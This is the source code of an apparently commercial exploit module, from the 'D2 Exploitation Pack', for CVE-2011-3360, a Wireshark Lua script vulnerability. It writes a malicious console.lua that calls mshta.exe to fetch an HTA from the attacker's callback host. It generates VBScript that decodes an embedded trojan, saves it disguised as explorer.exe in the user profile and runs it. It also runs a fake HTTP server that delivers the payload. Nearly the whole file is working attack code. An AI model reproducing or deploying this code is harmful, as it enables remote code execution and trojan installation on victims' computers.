#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#

import sys
import thread

if '.' not in sys.path: 
  sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from canvasexploit import canvasexploit
from libs.canvasos import *
from MOSDEF import pelib 
from libs.spkproxy import header, body

import canvasengine
import struct
import os


NAME = "d2sec_wireshark"
DESCRIPTION = "Wireshark Lua Script File Arbitrary Code Execution Vulnerability"

VERSION = "1.0"

DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2011.08.30"
DOCUMENTATION["Versions Affected"] = "1.4.x before 1.4.9 and 1.6.x before 1.6.2"
DOCUMENTATION["References"] = "https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=6136"
DOCUMENTATION["CVE Name"] = "CVE-2011-3360"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3360"

NOTES="""
iWhen the attacker double-clicks the cap/pcap file, Wireshark will be launching
by checking if there is a "console.lua" in the same directory, if it finds the
"console.lua" successfully, Wireshark will parse and execute content of the
"console.lua" as Lua scripts.

Usage:
.\commandlineInterface.py -p 5555 -v 0 
.\d2sec_wireshark.py -l 172.16.244.141 -d 443 
"""

DOCUMENTATION["Notes"] = NOTES

PROPERTY={}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]


class theexploit(tcpexploit):
  def __init__(self):
    tcpexploit.__init__(self)        
    self.name = NAME
    self.dstfile = os.path.join(os.getcwd(), '3rdparty/D2SEC/exploits/d2sec_wireshark/console.lua')
    self.trojanname = 'index.hta'
        
  # Create the hta file with the embedded binary
  def file4hta(self, exename):
    evilprog = "explorer.exe"
    e = []
    for a in exename:
      for b in a:
        if b == "\r":
          d = "0d"
        elif b == "\n":
          d = "0a"
        elif b == "\0":
          d = "00"
        else:
          c = hex(ord(b))
          d = c.replace("0x", "")
        if len(d) == 1:
          d = "0"+d
        e.append(d)
    i = 0
    j = 0
    l = len(e)
    hta = "<SCRIPT language=vbs>\n\n"
    while 1:
      hta += " prog = prog & \""
      while i != 24:
        hta += "%s," % e[j]
        if j == l-1:
          break
        i += 1
        j += 1
      if j == l-1:
        hta = hta[:-1] + "\"\n\n"
        break
      hta += "\"\n"
      i = 0
    hta += " tmp = Split(prog, \",\")\n"  
    hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
    hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
    hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
    hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
    hta += " Set f = fso.CreateTextFile(path, True)\n\n"
    hta += " For i = 0 To UBound(tmp)\n"
    hta += "   prog = Int(\"&H\" & tmp(i))\n"
    hta += "   f.Write Chr(prog)\n"
    hta += " Next\n\n"
    hta += " f.Close\n"
    hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
    hta += " self.Close\n"
    hta += "</SCRIPT>\n"
    return hta 
    
  def maketrojan(self):
    t_os = canvasos("Windows")
    t_os.arch = "X86"
    self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)
    self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))
    self.htafile = self.file4hta(self.mosdeftrojan)
    file(self.trojanname, "wb").write(self.htafile)
    self.setInfo("%s - done"%(NAME))
    ret = len(self.mosdeftrojan) != 0
    return ret

  def makesploit(self, clientheader, clientbody):            
    h = header('SERVER')
    b = body()
    self.maketrojan()
    if clientheader.URL.count(self.trojanname):
      self.log("[D2] Sending MOSDEF trojan")
      f = open(self.trojanname, "rb")
      sploitstring = f.read()
      f.close()
      os.remove(self.trojanname)
      self.log("[D2] Sending %d bytes"%len(sploitstring))
      h.addHeader("Content-type","binary/octet-stream")
      h.addHeader("Connection","close")
      b.setBody(sploitstring)
    return h, b

  def neededListenerTypes(self):
    from canvasengine import WIN32MOSDEF
    return [WIN32MOSDEF]


  #################################################################################################################
  # Code from httpserver.py
  def listen(self):
    #self.getargs()
    s=self.gettcplistener(80, "0.0.0.0")
    if not s:
      self.log("[D2] Cannot listen on port 80 - perhaps that port is already bound?")
      return 0
    s.set_timeout(5)
    self.s=s
    return s 

  def accept(self, s=None ):
    """
    Try to accept one connection
    returns true if we found one
    """
    #we loop on this ,so no annoying printouts here
    #self.log("Accepting connection")
    if s==None:
      s=self.s 
    try:
      infd,addr=s.accept()
    except timeoutsocket.Timeout:
      #self.log("Timed out - no accept yet")
      return 
    if infd==-1:
      return
    #else we have an infd
    self.handle(infd)
    return True #handled connection
      
  def handle(self, infd): 
    self.log("[D2] Handling connection")
    clientheader = header(state = "SERVER")
    clientheader.ssl = self.ssl
    ret = clientheader.readdata(infd)
    clientbody = body()
    if clientheader.gotGoodHeader():
      if clientheader.bodySize()>0 or clientheader.wasChunked:
        self.log("[D2] Reading body")
        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
        self.log("[D2] Read body")
    self.log("[D2] Creating exploit response")
    servheader,servbody = self.makesploit(clientheader,clientbody)
    self.log("[D2] Responding")
    bodydata="".join(servbody.data)
    #now we respond...
    response = ""
    response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
    self.log(response)
    for akey in servheader.headerValuesDict.keys():
      if akey not in [ "Content-Length", "Content-length"]:
        response += servheader.grabHeader(akey)
    self.log("[D2] Sending header data of %d bytes"%len(response))
    chunked=0 #for now, eventually we'll send random chunks down the pipe.\..
    if not chunked:
      response+="Content-Length: "+str(len(bodydata))+"\r\n"
    response+="\r\n"
    response+="".join(bodydata)
    self.log("[D2] Total response length is %d bytes"%len(response))
    try:
      infd.sendall(response)
    except socket.error:
      self.log("[D2] Connection closed by peer")
    self.log("[D2] Response sent")
    infd.close() #connection close - later on we'll keep it.
    return 
  #
  #################################################################################################################
        
  def startHTTPServer(self):
    s=self.listen()
    if not s:
      self.log("[D2] Failed to listen - not running")
      return 0
    while 1:
      if self.state==self.HALT:
        self.s.close()
        break
      self.accept()
    self.setInfo("[D2] %s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
    return 1

  def run(self):
    self.log("[D2] Creating console.lua file")
    f = open(self.dstfile, "w")
    f.write('os.execute("mshta.exe http://%s/%s")' % (self.callback.ip, self.trojanname))
    f.close()
    self.log("[D2] Copy %s on victim box ..." % self.dstfile) 
    thread.start_new_thread(self.startHTTPServer,())
    self.log("[D2] Fake HTTP server started")
    while 1:
      time.sleep(1)
    return 0

  def usage(self):        
    print "Usage: %s -l localip -d localport\n" % sys.argv[0]
    sys.exit(0) 


if __name__=='__main__':
  app = theexploit()
  ret = standard_callback_commandline(app)

